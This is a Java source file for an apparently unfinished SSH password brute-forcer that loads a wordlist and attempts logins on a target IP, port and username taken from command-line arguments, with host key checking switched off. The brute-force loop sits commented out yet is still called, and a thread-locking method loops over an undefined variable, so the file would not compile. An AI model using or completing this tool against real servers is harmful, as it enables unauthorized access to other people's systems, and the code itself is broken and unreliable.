package solirs.sshbrutewj;


/* ##---------IMPORTS---------#*/

import com.jcraft.jsch.*; //SSH library
import java.util.Queue;
import java.io.IOException;
import java.util.LinkedList;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Iterator;

/* ##---------IMPORTS---------#*/

public class Main
{

    private static void loadwordlist() throws IOException{

        FileInputStream fstream = new FileInputStream(ProgramSettings.wordlist);
        BufferedReader br = new BufferedReader(new InputStreamReader(fstream));

        String line;

        while ((line = br.readLine()) != null)   {
            ProgramSettings.queue.add(line);
        }

        fstream.close();

    }
    
    // private static void sshbrute() throws JSchException{

    //     //This is an experimental engine for the bruteforcer.

    //     JSch jsch = new JSch(); //Initialize jsch and the config
    //     jsch.setConfig("StrictHostKeyChecking", "no"); //Disable StrictHostKeyChecking since it causes issues with the ssh connection.

    //     String user = "user";
    //     int port = 3022;
    //     Iterator<String> itr = BruteData.iterator();

    //     while (itr.hasNext()){

    //         try{
    //             //Try to connect with the password, if it works exit and print the password.

    //             String pass = itr.next();


    //             System.out.println("Trying "+ pass);
    //             Session session=jsch.getSession(user, "localhost", port);

    //             session.setTimeout(100);
    
    //             session.setPassword(pass);
    //             session.connect();
    //             System.out.println("CONNECTED " + "Password is " + pass);
    //             System.exit(0);
                
    //         }catch(Exception e){
    //             //Continue if the password is wrong
    //             continue;
    //         }

    //     }

    // }

    public static void lockAllThreads() {
        for (Thread thread : iterable) {
            
        }
    }

    public static void main( String[] args )
    {
        ProgramSettings.ip = args[0];
        ProgramSettings.port = Integer.valueOf(args[1]);
        ProgramSettings.username = args[2];
        ProgramSettings.wordlist = args[3];
        ProgramSettings.threadCount = Integer.valueOf(args[4]);
        ProgramSettings.verboseMode = Boolean.valueOf(args[5]);

        //It all starts here
        System.out.println("Starting...");

        try{
            loadwordlist();
            sshbrute();
        } catch(Exception j){
            System.out.print(j);
        }
    }
}
